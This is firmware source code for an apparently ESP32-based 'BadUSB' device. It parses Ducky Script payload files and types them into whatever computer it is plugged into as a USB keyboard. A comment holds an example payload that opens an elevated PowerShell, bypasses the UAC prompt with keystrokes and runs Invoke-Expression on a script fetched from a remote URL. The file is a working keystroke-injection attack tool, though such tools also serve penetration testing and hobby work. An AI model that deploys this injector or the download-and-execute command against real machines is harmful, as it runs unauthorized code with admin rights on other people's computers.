#ifdef USB_as_HID
#include "core/globals.h"
#include "core/sd_functions.h"
#include "core/main_menu.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "bad_usb.h"

USBHIDKeyboard Kb;


//#include <BleKeyboard.h>
//BleKeyboard bleKeyboard;
//

#define DEF_DELAY 100

/* Example of payload file

REM Author: UNC0V3R3D
REM Description: Uses powershell to rotate the monitor by 90 degrees.
REM Version: 1.0
REM Category: FUN
DELAY 800
GUI r
DELAY 800
STRING powershell Start-Process powershell -Verb runAs
DELAY 800
ENTER
DELAY 800
LEFTARROW
DELAY 800
ENTER
DELAY 500
STRING Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/UNC0V3R3D/resources/main/monitor_rotation.ps1").Content


*/

void key_input(FS fs, String bad_script) {
  if (fs.exists(bad_script) && bad_script!="") {
    File payloadFile = fs.open(bad_script, "r");
    if (payloadFile) {
      tft.setCursor(0, 40);
      tft.println("from file!");
      String lineContent = "";
      String Command = "";
      char Cmd[15];
      String Argument = "";
      String RepeatTmp = "";
      char ArgChar;
      bool ArgIsCmd;  // Verifies if the Argument is DELETE, TAB or F1-F12
      int cmdFail;    // Verifies if the command is supported, mus pass through 2 if else statemens and summ 2 to not be supported
      int line;       // Shows 3 commands of the payload on screen to follow the execution


      Kb.releaseAll();
      tft.setTextSize(1);
      tft.setCursor(0, 0);
      tft.fillScreen(BGCOLOR);
      line = 0;

      while (payloadFile.available()) {
        lineContent = payloadFile.readStringUntil('\n');  // O CRLF é uma combinação de dois caracteres de controle: o “Carriage Return” (retorno de carro) representado pelo caractere “\r” e o “Line Feed” (avanço de linha) representado pelo caractere “\n”.
        if (lineContent.endsWith("\r")) lineContent.remove(lineContent.length() - 1);

        ArgIsCmd = false;
        cmdFail = 0;
        RepeatTmp = lineContent.substring(0, lineContent.indexOf(' '));
        RepeatTmp = RepeatTmp.c_str();
        if (RepeatTmp == "REPEAT") {
          if (lineContent.indexOf(' ') > 0) {
            RepeatTmp = lineContent.substring(lineContent.indexOf(' ') + 1);  // how many times it will repeat, using .toInt() conversion;
            if (RepeatTmp.toInt() == 0) {
              RepeatTmp = "1";
              tft.setTextColor(ALCOLOR);
              tft.println("REPEAT argument NaN, repeating once");
            }
          } else {
            RepeatTmp = "1";
            tft.setTextColor(ALCOLOR);
            tft.println("REPEAT without argument, repeating once");
          }
        } else {
          Command = lineContent.substring(0, lineContent.indexOf(' '));    // get the Command
          strcpy(Cmd, Command.c_str());                                    // get the cmd
          Argument = lineContent.substring(lineContent.indexOf(' ') + 1);  // get the argument
          RepeatTmp = "1";
        }
        uint16_t i;
        for (i = 0; i < RepeatTmp.toInt(); i++) {
          char OldCmd[15];
          //Command = char(Command.c_str());
          Argument = Argument.c_str();
          ArgChar = Argument.charAt(0);


          if (Argument == "F1" || Argument == "F2" || Argument == "F3" || Argument == "F4" || Argument == "F5" || Argument == "F6" || Argument == "F7" || Argument == "F8" || Argument == "F9" || Argument == "F10" || Argument == "F11" || Argument == "F2" || Argument == "DELETE" || Argument == "TAB" || Argument == "ENTER") { ArgIsCmd = true; }

          restart: // restart checks

          if (strcmp(Cmd, "REM") == 0)          { Serial.println(" // " + Argument); }                  else { cmdFail++; }
          if (strcmp(Cmd, "DELAY") == 0)        { delay(Argument.toInt()); }                            else { cmdFail++; }
          if (strcmp(Cmd, "DEFAULTDELAY") == 0 || strcmp(Cmd, "DEFAULT_DELAY") == 0) delay(DEF_DELAY);  else { cmdFail++; }  //100ms
          if (strcmp(Cmd, "STRING") == 0)       { Kb.print(Argument);}                                  else { cmdFail++; }
          if (strcmp(Cmd, "STRINGLN") == 0)     { Kb.println(Argument); }                               else { cmdFail++; }
          if (strcmp(Cmd, "SHIFT") == 0)        { Kb.press(KEY_LEFT_SHIFT);                                                         if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}  // Save Cmd into OldCmd and then set Cmd = Argument
          if (strcmp(Cmd, "ALT") == 0)          { Kb.press(KEY_LEFT_ALT);                                                           if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}  // This is made to turn the code faster and to recover
          if (strcmp(Cmd, "CTRL-ALT") == 0)     { Kb.press(KEY_LEFT_ALT); Kb.press(KEY_LEFT_CTRL);                                  if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}  // the Cmd after the if else statements, in order to
          if (strcmp(Cmd, "CTRL-SHIFT") == 0)   { Kb.press(KEY_LEFT_CTRL); Kb.press(KEY_LEFT_SHIFT);                                if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}// the Cmd REPEAT work as intended.
          if (strcmp(Cmd, "CTRL-GUI") == 0)     { Kb.press(KEY_LEFT_CTRL); Kb.press(KEY_LEFT_GUI);                                  if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
          if (strcmp(Cmd, "ALT-SHIFT") == 0)    { Kb.press(KEY_LEFT_ALT); Kb.press(KEY_LEFT_SHIFT);                                 if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
          if (strcmp(Cmd, "ALT-GUI") == 0)      { Kb.press(KEY_LEFT_ALT); Kb.press(KEY_LEFT_GUI);                                   if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
          if (strcmp(Cmd, "GUI-SHIFT") == 0)    { Kb.press(KEY_LEFT_GUI); Kb.press(KEY_LEFT_SHIFT);                                 if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
          if (strcmp(Cmd, "CTRL-ALT-SHIFT") == 0) { Kb.press(KEY_LEFT_ALT); Kb.press(KEY_LEFT_CTRL); Kb.press(KEY_LEFT_SHIFT);      if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
          if (strcmp(Cmd, "CTRL-ALT-GUI") == 0)   { Kb.press(KEY_LEFT_ALT); Kb.press(KEY_LEFT_CTRL); Kb.press(KEY_LEFT_GUI);        if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
          if (strcmp(Cmd, "ALT-SHIFT-GUI") == 0)  { Kb.press(KEY_LEFT_ALT); Kb.press(KEY_LEFT_SHIFT); Kb.press(KEY_LEFT_GUI);       if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
          if (strcmp(Cmd, "CTRL-SHIFT-GUI") == 0) { Kb.press(KEY_LEFT_CTRL); Kb.press(KEY_LEFT_SHIFT); Kb.press(KEY_LEFT_GUI);      if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
          if (strcmp(Cmd, "GUI") == 0 || strcmp(Cmd, "WINDOWS") == 0) { Kb.press(KEY_LEFT_GUI);                                     if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
          if (strcmp(Cmd, "CTRL") == 0 || strcmp(Cmd, "CONTROL") == 0) { Kb.press(KEY_LEFT_CTRL);                                   if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
          if (strcmp(Cmd, "ESC") == 0 || strcmp(Cmd, "ESCAPE") == 0) {Kb.press(KEY_ESC);Kb.releaseAll(); } else { cmdFail++;}
          if (strcmp(Cmd, "ENTER") == 0)        { Kb.press(KEY_RETURN); Kb.releaseAll(); }    else { cmdFail++; }
          if (strcmp(Cmd, "DOWNARROW") == 0)    { Kb.press(KEY_DOWN_ARROW); Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "DOWN") == 0)         { Kb.press(KEY_DOWN_ARROW); Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "LEFTARROW") == 0)    { Kb.press(KEY_LEFT_ARROW); Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "LEFT") == 0)         { Kb.press(KEY_LEFT_ARROW); Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "RIGHTARROW") == 0)   { Kb.press(KEY_RIGHT_ARROW);Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "RIGHT") == 0)        { Kb.press(KEY_RIGHT_ARROW);Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "UPARROW") == 0)      { Kb.press(KEY_UP_ARROW);   Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "UP") == 0)           { Kb.press(KEY_UP_ARROW);   Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "BREAK") == 0)        { Kb.press(KEY_PAUSE);      Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "CAPSLOCK") == 0)     { Kb.press(KEY_CAPS_LOCK);  Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "PAUSE") == 0)        { Kb.press(KEY_PAUSE);      Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "BACKSPACE") == 0)    { Kb.press(KEYBACKSPACE);   Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "END") == 0)          { Kb.press(KEY_END);        Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "HOME") == 0)         { Kb.press(KEY_HOME);       Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "INSERT") == 0)       { Kb.press(KEY_INSERT);     Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "NUMLOCK") == 0)      { Kb.press(LED_NUMLOCK);    Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "PAGEUP") == 0)       { Kb.press(KEY_PAGE_UP);    Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "PAGEDOWN") == 0)     { Kb.press(KEY_PAGE_DOWN);  Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "PRINTSCREEN") == 0)  { Kb.press(KEY_PRINT_SCREEN);Kb.releaseAll();}else { cmdFail++;}
          if (strcmp(Cmd, "SCROLLOCK") == 0)    { Kb.press(KEY_SCROLL_LOCK);Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "MENU") == 0)         { Kb.press(KEY_MENU);       Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F1") == 0)           { Kb.press(KEY_F1);         Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F2") == 0)           { Kb.press(KEY_F2);         Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F3") == 0)           { Kb.press(KEY_F3);         Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F4") == 0)           { Kb.press(KEY_F4);         Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F5") == 0)           { Kb.press(KEY_F5);         Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F6") == 0)           { Kb.press(KEY_F6);         Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F7") == 0)           { Kb.press(KEY_F7);         Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F8") == 0)           { Kb.press(KEY_F8);         Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F9") == 0)           { Kb.press(KEY_F9);         Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F10") == 0)          { Kb.press(KEY_F10);        Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F11") == 0)          { Kb.press(KEY_F11);        Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F12") == 0)          { Kb.press(KEY_F12);        Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "TAB") == 0)          { Kb.press(KEYTAB);         Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "DELETE") == 0)       { Kb.press(KEY_DELETE);     Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "SPACE") ==0)         { Kb.press(KEY_SPACE);      Kb.releaseAll();} else { cmdFail++;}

          if (ArgIsCmd) strcpy(Cmd, OldCmd);  // Recover the command to run in case of REPEAT

          Kb.releaseAll();

          if (line == 7) {
            tft.setCursor(0, 0);
            tft.fillScreen(BGCOLOR);
            line = 0;
          }
          line++;

          if (cmdFail == 57) {
            tft.setTextColor(ALCOLOR);
            tft.print(Command);
            tft.println(" -> Not Supported, running as STRINGLN");
            if (Command != Argument) {
              Kb.print(Command);
              Kb.print(" ");
              Kb.println(Argument);
            } else {
              Kb.println(Command);
            }
          } else {
            tft.setTextColor(FGCOLOR);
            tft.println(Command);
          }
          tft.setTextColor(TFT_WHITE);
          tft.println(Argument);

          if (strcmp(Cmd, "REM") != 0) delay(DEF_DELAY);  //if command is not a comment, wait DEF_DELAY until next command (100ms)
        }
      }
      tft.setTextSize(FM);
      payloadFile.close();
      Serial.println("Finished badusb payload execution...");
    }
  } else {
    // rick
    Serial.println("rick");
    tft.setCursor(0, 40);
    tft.println("rick");
    Kb.press(KEY_LEFT_GUI);
    Kb.press('r');
    Kb.releaseAll();
    delay(1000);
    Kb.print("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
    Kb.press(KEY_RETURN);
    Kb.releaseAll();
  }

  delay(1000);
  Kb.releaseAll();
}

bool kbChosen = false;

void chooseKb(const uint8_t *layout) {
  kbChosen = true;
  Kb.begin(layout);
}


void usb_setup() {
  Serial.println("BadUSB begin");
  tft.fillScreen(BGCOLOR);
  String bad_script = "";
  bad_script = "/badpayload.txt";

  FS *fs;
  if(setupSdCard()) {
    bool teste=false;
    options = {
      {"SD Card", [&]()  { fs=&SD; }},
      {"LittleFS", [&]()   { fs=&LittleFS; }},
    };
    delay(200);
    loopOptions(options);
  } else fs=&LittleFS;

  bad_script = loopSD(*fs,true);
  tft.fillScreen(BGCOLOR);
  drawMainMenu(4);

  options = {
    {"US Inter",    [=]() { chooseKb(KeyboardLayout_en_US); }},
    {"PT-BR ABNT2", [=]() { chooseKb(KeyboardLayout_pt_BR); }},
    {"PT-Portugal", [=]() { chooseKb(KeyboardLayout_pt_PT); }},
    {"AZERTY FR",   [=]() { chooseKb(KeyboardLayout_fr_FR); }},
    {"es-Espanol",  [=]() { chooseKb(KeyboardLayout_es_ES); }},
    {"it-Italiano", [=]() { chooseKb(KeyboardLayout_it_IT); }},
    {"en-UK",       [=]() { chooseKb(KeyboardLayout_en_UK); }},    
    {"de-DE",       [=]() { chooseKb(KeyboardLayout_de_DE); }},
    {"sv-SE",       [=]() { chooseKb(KeyboardLayout_sv_SE); }},
    {"da-DK",       [=]() { chooseKb(KeyboardLayout_da_DK); }},
    {"hu-HU",       [=]() { chooseKb(KeyboardLayout_hu_HU); }},
  };
  delay(200);
  loopOptions(options,false,true,"Keyboard Layout");
  if (!kbChosen) Kb.begin(); // starts the KeyboardLayout_en_US as default if nothing had beed chosen (cancel selection)
  USB.begin();
  displayRedStripe("Preparing",TFT_WHITE, FGCOLOR);
  delay(2000);
  key_input(*fs, bad_script);

  displayRedStripe("Payload Sent",TFT_WHITE, FGCOLOR);
  checkSelPress();
  while (!checkSelPress()) {
      // nothing here, just to hold the screen press Ok of M5.
  }
  returnToMenu=true;

}




//Now cardputer works as a USB Keyboard!

//Keyboard functions
//Created by: edulk2, thankss

void usb_keyboard() {
  drawMainBorder();
  tft.setTextSize(2);
  tft.setTextColor(FGCOLOR);
  tft.drawString("Keyboard Started",
                  WIDTH / 2,
                  HEIGHT / 2);
  options = {
    {"US Inter",    [=]() { chooseKb(KeyboardLayout_en_US); }},
    {"PT-BR ABNT2", [=]() { chooseKb(KeyboardLayout_pt_BR); }},
    {"PT-Portugal", [=]() { chooseKb(KeyboardLayout_pt_PT); }},
    {"AZERTY FR",   [=]() { chooseKb(KeyboardLayout_fr_FR); }},
    {"es-Espanol",  [=]() { chooseKb(KeyboardLayout_es_ES); }},
    {"it-Italiano", [=]() { chooseKb(KeyboardLayout_it_IT); }},
    {"en-UK",       [=]() { chooseKb(KeyboardLayout_en_UK); }},    
    {"de-DE",       [=]() { chooseKb(KeyboardLayout_de_DE); }},
    {"sv-SE",       [=]() { chooseKb(KeyboardLayout_sv_SE); }},
    {"da-DK",       [=]() { chooseKb(KeyboardLayout_da_DK); }},
    {"hu-HU",       [=]() { chooseKb(KeyboardLayout_hu_HU); }},
  };
  delay(200);
  loopOptions(options,false,true,"Keyboard Layout");
  USB.begin();

  tft.setTextColor(FGCOLOR, BGCOLOR);
  tft.setTextSize(FP);
  drawMainBorder();
  tft.setCursor(10,28);
  tft.println("Usb Keyboard:");
  tft.setTextSize(FM);

  while(1) {
    Keyboard.update();
    if (Keyboard.isChange()) {
      if (Keyboard.isPressed()) {
        Keyboard_Class::KeysState status = Keyboard.keysState();

        KeyReport report = { 0 };
        report.modifiers = status.modifiers;
        uint8_t index = 0;
        for (auto i : status.hid_keys) {
          report.keys[index] = i;
          index++;
          if (index > 5) {
            index = 5;
          }
        }
        Kb.sendReport(&report);
        Kb.releaseAll();

        // only text for tftlay
        String keyStr = "";
        for (auto i : status.word) {
          if (keyStr != "") {
            keyStr = keyStr + "+" + i;
          } else {
            keyStr += i;
          }
        }

        if (keyStr.length() > 0) {
          drawMainBorder(false);
          tft.drawCentreString("Pressed: " + keyStr, WIDTH / 2, HEIGHT / 2,1);
          delay(100);
        }
      }
    }
  }
}


#endif